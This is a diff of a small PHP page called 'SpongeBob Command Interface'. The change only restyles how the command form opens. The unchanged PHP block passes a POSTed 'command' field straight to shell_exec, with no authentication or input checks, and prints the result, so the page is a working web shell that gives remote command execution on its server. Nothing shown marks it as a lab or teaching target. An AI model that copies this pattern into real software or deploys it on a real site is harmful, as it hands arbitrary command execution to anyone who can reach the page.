@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -22,6 +21,11 @@
             border-radius: 10px;
             max-width: 600px;
             margin: 20px auto;
+            cursor: pointer;
+        }
+
+        h2:hover {
+            background-color: #0096c7;
         }
 
         form, pre {
@@ -58,27 +62,30 @@
         }
     </style>
 </head>
-<body>
-    <h2>SpongeBob Command Interface</h2>
 
-    <button type="button" onclick="showCommandBox()">
-        Open Command Console
-    </button>
+<body>
+    <h2 onclick="showCommandBox()">
+        SpongeBob Command Interface
+    </h2>
 
     <div id="commandBox">
         <form method="POST">
-            <input type="text" name="command"
-                   placeholder="Enter a command" required>
+            <input
+                type="text"
+                name="command"
+                placeholder="Enter a command"
+                required
+            >
             <button type="submit">Run!</button>
         </form>
     </div>
 
     <pre><?php
-    if ($_SERVER["REQUEST_METHOD"] === "POST") {
-        $command = $_POST["command"] ?? "";
-        $output = shell_exec($command);
-        echo htmlspecialchars($output ?? "", ENT_QUOTES, "UTF-8");
-    }
+        if ($_SERVER["REQUEST_METHOD"] === "POST") {
+            $command = $_POST["command"] ?? "";
+            $output = shell_exec($command);
+            echo htmlspecialchars($output ?? "", ENT_QUOTES, "UTF-8");
+        }
     ?></pre>
 
     <script>
